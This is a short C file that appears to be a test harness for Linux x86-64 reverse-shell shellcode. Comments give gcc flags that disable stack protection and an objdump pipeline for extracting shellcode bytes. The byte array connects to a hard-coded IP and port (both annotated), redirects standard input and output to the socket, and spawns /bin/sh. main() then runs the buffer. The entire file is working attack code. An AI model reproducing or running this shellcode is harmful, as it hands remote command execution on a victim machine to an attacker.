/*gcc -fno-stack-protector -z execstack testshell.c -o testshell*/


/*objdump -d ./reverseshell2|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'*/
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    unsigned char shellcode []=
"\x48\x31\xf6\xb0"
"\x29\x40\xb7\x02"
"\x40\xb6\x01\x48"
"\x31\xd2\x0f\x05"
"\x48\x89\xc7\x52"
"\xc7\x44\x24\x04"
"\xac\x13\xc8\x92"/*ip*/
"\x66\xc7\x44\x24"
"\x02"
"\x22\xb8"/*port*/
"\xc6\x04\x24\x02"
"\xb2\x10\x48\x89"
"\xe6\xb0\x2a\x0f"
"\x05\x48\x31\xf6"
"\xb0\x21\x0f\x05"
"\x48\xff\xc6\x40"
"\x80\xfe\x03\x75"
"\xf3\x48\x31\xc0"
"\x48\x31\xd2\x48"
"\xbb\x2f\x2f\x62"
"\x69\x6e\x2f\x73"
"\x68\x48\xc1\xeb"
"\x08\x53\x48\x89"
"\xe7\x50\x57\x48"
"\x89\xe6\xb0\x3b"
"\x0f\x05";
        

    
    printf("Shellcode Length:  %d\n", strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();

    	
	return 0;
}
